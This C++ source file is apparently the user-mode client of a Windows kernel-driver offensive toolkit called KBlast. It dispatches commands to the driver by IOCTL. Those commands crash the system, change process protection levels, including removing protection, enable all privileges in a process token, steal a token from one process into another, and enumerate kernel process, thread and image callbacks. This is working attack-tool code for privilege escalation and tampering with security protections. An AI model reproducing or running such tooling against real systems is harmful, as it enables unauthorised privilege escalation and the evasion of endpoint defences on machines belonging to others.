#include "KBlast_c_device_dispatch.hpp"



BOOL KBlast_c_device_interact(IN DWORD ControlCode, IN OPTIONAL PKBLAST_BUFFER pCommandLine, OUT OPTIONAL LPVOID outBuffer, IN OPTIONAL DWORD szOutBuffer)
{
	BOOL status = FALSE;
	HANDLE hDriver = 0;
	DWORD bsReturned = 0;

	hDriver = CreateFile(KBLAST_DRV_FILENAME, GENERIC_ALL, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
	if (hDriver != INVALID_HANDLE_VALUE)
	{
		status = DeviceIoControl(hDriver, ControlCode, (LPVOID)pCommandLine, sizeof(KBLAST_BUFFER), outBuffer, szOutBuffer, &bsReturned, 0);
		CloseHandle(hDriver);
	}

	return status;

}


BOOL KBlast_c_device_dispatch_misc(wchar_t* input)
{
	BOOL status = FALSE;
	KBLAST_COMMANDLINE_ARGUMENTS args = { 0 };
	char* realInput = 0;
	int argc = 0;


	realInput = KBlast_c_utils_UnicodeStringToAnsiString(input);
	argc = KBlast_c_utils_GetCommandLineArguments(realInput, 0x7C, &args);
	if (args.arg1 != 0)
	{
		if (strcmp(args.arg1, "bsod") == 0)
		{
			status = KBlast_c_device_interact(KBLAST_IOCTL_BUG_CHECK, NULL, NULL, NULL);
		}
		if (strcmp(args.arg1, "blob") == 0)
		{
			if ((strcmp(args.arg2, "save") == 0))
			{
				status = KBlast_c_blob_manage(args.arg3, NULL, BLOB_SAVE);
			}
			if ((strcmp(args.arg2, "delete") == 0))
			{
				status = KBlast_c_blob_manage(NULL, (char*)args.arg3, BLOB_DELETE);
			}
			/*
			if ((strcmp(args.arg2, "execute") == 0))
			{
				status = KBlast_c_blob_manage(NULL, (char*) args.arg3, BLOB_EXECUTE);
			}
			*/
			if ((strcmp(args.arg2, "info") == 0))
			{
				status = KBlast_c_blob_manage(NULL, (char*)args.arg3, BLOB_INFO);
			}
		}
	}

	return status;

}


BOOL KBlast_c_device_dispatch_protection(wchar_t* input)
{
	BOOL status = FALSE;
	KBLAST_COMMANDLINE_ARGUMENTS args = { 0 };
	KBLAST_BUFFER DeviceArgs = { 0 };
	char* realInput = 0;
	int argc = 0;

	realInput = KBlast_c_utils_UnicodeStringToAnsiString(input);
	argc = KBlast_c_utils_GetCommandLineArguments(realInput, 0x7C, &args);
	if ((args.arg1 != NULL) && (args.arg2 != NULL))  // don't really need to check argc
	{
		if (strcmp((const char*)((PUCHAR)args.arg1), "wintcb") == 0)
		{
			DeviceArgs.integer1 = atoi((const char*)((PUCHAR)args.arg2));
			if (DeviceArgs.integer1 != 0)
			{
				printf("prot: wintcb protect -> %d\n", DeviceArgs.integer1);
				status = KBlast_c_device_interact(KBLAST_IOCTL_PROTECT_WINTCB, &DeviceArgs, NULL, NULL);
				// check result
			}
		}
		if (strcmp((const char*)((PUCHAR)args.arg1), "lsa") == 0)
		{
			DeviceArgs.integer1 = atoi((const char*)((PUCHAR)args.arg2));
			if (DeviceArgs.integer1 != 0)
			{
				printf("prot: lsa protect -> %d\n", DeviceArgs.integer1);
				status = KBlast_c_device_interact(KBLAST_IOCTL_PROTECT_LSA, &DeviceArgs, NULL, NULL);
				// check result
			}
		}
		if (strcmp((const char*)((PUCHAR)args.arg1), "antimalware") == 0)
		{
			DeviceArgs.integer1 = atoi((const char*)((PUCHAR)args.arg2));
			if (DeviceArgs.integer1 != 0)
			{
				printf("prot: antimalware protect -> %d\n", DeviceArgs.integer1);
				status = KBlast_c_device_interact(KBLAST_IOCTL_PROTECT_ANTIMALWARE, &DeviceArgs, NULL, NULL);
				// check result
			}
		}
		if (strcmp((const char*)((PUCHAR)args.arg1), "none") == 0)
		{
			DeviceArgs.integer1 = atoi((const char*)((PUCHAR)args.arg2));
			if (DeviceArgs.integer1 != 0)
			{
				printf("prot: none protect -> %d\n", DeviceArgs.integer1);
				status = KBlast_c_device_interact(KBLAST_IOCTL_PROTECT_NONE, &DeviceArgs, NULL, NULL);
				// check result
			}
		}
	}

	KBlast_c_utils_FreeAnsiString(realInput);

	return status;

}


BOOL KBlast_c_device_dispatch_privileges(wchar_t* input)
{
	BOOL status = FALSE;
	KBLAST_COMMANDLINE_ARGUMENTS args = { 0 };
	KBLAST_BUFFER DeviceArgs = { 0 };
	//DWORD processID = 0;
	char* realInput = 0;
	int argc = 0;


	realInput = KBlast_c_utils_UnicodeStringToAnsiString(input);
	argc = KBlast_c_utils_GetCommandLineArguments(realInput, 0x7C, &args);

	if ((argc > 0) && (args.arg1 != NULL) && (args.arg2 != NULL))  // don't really need to check argc
	{
		if (strcmp((const char*)((PUCHAR)args.arg1), "enable") == 0)
		{
			DeviceArgs.integer1 = atoi((const char*)((PUCHAR)args.arg2));
			if (DeviceArgs.integer1 != 0)
			{
				printf("priv: enabling full -> %d\n", DeviceArgs.integer1);
				status = KBlast_c_device_interact(KBLAST_IOCTL_TOKEN_PRIVILEGES_ENABLEALL, &DeviceArgs, NULL, NULL);
				// check result
			}
		}
		if (strcmp((const char*)((PUCHAR)args.arg1), "disable") == 0)
		{
			DeviceArgs.integer1 = atoi((const char*)((PUCHAR)args.arg2));
			if (DeviceArgs.integer1 != 0)
			{
				printf("priv: disabling all -> %d\n", DeviceArgs.integer1);
				status = KBlast_c_device_interact(KBLAST_IOCTL_TOKEN_PRIVILEGES_DISABLEALL, &DeviceArgs, NULL, NULL);
				// check result
			}
		}
	}

	KBlast_c_utils_FreeAnsiString(realInput);

	return status;
}


BOOL KBlast_c_device_dispatch_token(wchar_t* input)
{
	BOOL status = FALSE;
	KBLAST_COMMANDLINE_ARGUMENTS args = { 0 };
	KBLAST_BUFFER DeviceArgs = { 0 };
	char* realInput = 0;
	int argc = 0;


	realInput = KBlast_c_utils_UnicodeStringToAnsiString(input);
	argc = KBlast_c_utils_GetCommandLineArguments(realInput, 0x7C, &args);
	if ((argc > 0) && (args.arg1 != NULL) && (args.arg2 != NULL) && (args.arg3 != NULL)) // don't really need to check argc
	{
		if (strcmp((const char*)((PUCHAR)args.arg1), "steal") == 0)
		{
			DeviceArgs.integer2 = atoi((const char*)((PUCHAR)args.arg2));
			DeviceArgs.integer1 = atoi((const char*)((PUCHAR)args.arg3));
			if ((DeviceArgs.integer1 != 0) && (DeviceArgs.integer2 != 0))
			{
				printf("tokn: steal : %d <- %d (token)\n", DeviceArgs.integer1, DeviceArgs.integer2);
				status = KBlast_c_device_interact(KBLAST_IOCTL_TOKEN_STEAL, &DeviceArgs, NULL, NULL);
				// check result
			}
		}
		if (strcmp((const char*)((PUCHAR)args.arg1), "restore") == 0)
		{
			DeviceArgs.integer1 = atoi((const char*)((PUCHAR)args.arg2));
			if (DeviceArgs.integer1 != 0)
			{
				printf("tokn: restore : %d\n", DeviceArgs.integer1);
				status = KBlast_c_device_interact(KBLAST_IOCTL_TOKEN_RESTORE, &DeviceArgs, NULL, NULL);
				// check result
			}
		}
	}


	KBlast_c_utils_FreeAnsiString(realInput);

	return status;

}


BOOL KBlast_c_device_dispatch_callbacks(wchar_t* input)
{
	BOOL status = FALSE;
	KBLAST_COMMANDLINE_ARGUMENTS args = { 0 };
	KBLAST_BUFFER DeviceArgs = { 0 };
	PPROCESS_KERNEL_CALLBACK_ARRAY pOutBuffer = 0;
	DWORD i = 0;
	char* realInput = 0;
	int argc = 0;


	realInput = KBlast_c_utils_UnicodeStringToAnsiString(input);
	argc = KBlast_c_utils_GetCommandLineArguments(realInput, 0x7C, &args);

	if ((args.arg1 != NULL) && (args.arg2 != NULL))
	{
		if (strcmp((const char*)((PUCHAR)args.arg2), "list") == 0)
		{
			pOutBuffer = (PPROCESS_KERNEL_CALLBACK_ARRAY)LocalAlloc(LPTR, sizeof(PROCESS_KERNEL_CALLBACK_ARRAY));
			if (pOutBuffer != 0)
			{
				if (strcmp((const char*)((PUCHAR)args.arg1), "process") == 0)
				{
					status = KBlast_c_device_interact(KBLAST_IOCTL_CALLBACK_PROCESS_LIST, NULL, (LPVOID)pOutBuffer, sizeof(PROCESS_KERNEL_CALLBACK_ARRAY));
					// check result
				}
				if (strcmp((const char*)((PUCHAR)args.arg1), "thread") == 0)
				{
					status = KBlast_c_device_interact(KBLAST_IOCTL_CALLBACK_THREAD_LIST, NULL, (LPVOID)pOutBuffer, sizeof(PROCESS_KERNEL_CALLBACK_ARRAY));
					// check result
				}
				if (strcmp((const char*)((PUCHAR)args.arg1), "image") == 0)
				{
					status = KBlast_c_device_interact(KBLAST_IOCTL_CALLBACK_IMAGE_LIST, NULL, (LPVOID)pOutBuffer, sizeof(PROCESS_KERNEL_CALLBACK_ARRAY));
					// check result
				}
			}
		}
	}

	KBlast_c_utils_FreeAnsiString(realInput);

	if (status == TRUE)
	{
		ULONG offset = 0;
		char* name = 0;
		for (i = 0; i < pOutBuffer->CallbackQuota; i++)
		{
			offset = (ULONG)((DWORD_PTR)pOutBuffer->CallbackInformation[i].CallbackFunctionPointer - (DWORD_PTR)pOutBuffer->CallbackInformation[i].ModuleInformation.ModuleBase);
			name = KBlast_c_utils_GetImageNameByFullPath(pOutBuffer->CallbackInformation[i].ModuleInformation.ModuleFullPathName);
			printf("[+] Handle : 0x%-016p | Pointer : 0x%-016p ( %s + %lu )\n", (PVOID)pOutBuffer->CallbackInformation[i].CallbackHandle, (PVOID)pOutBuffer->CallbackInformation[i].CallbackFunctionPointer, name, offset);
		}
		offset = 0;
		name = 0;

		RtlZeroMemory(pOutBuffer, sizeof(PROCESS_KERNEL_CALLBACK_ARRAY));
		LocalFree(pOutBuffer);

	}

	return status;
}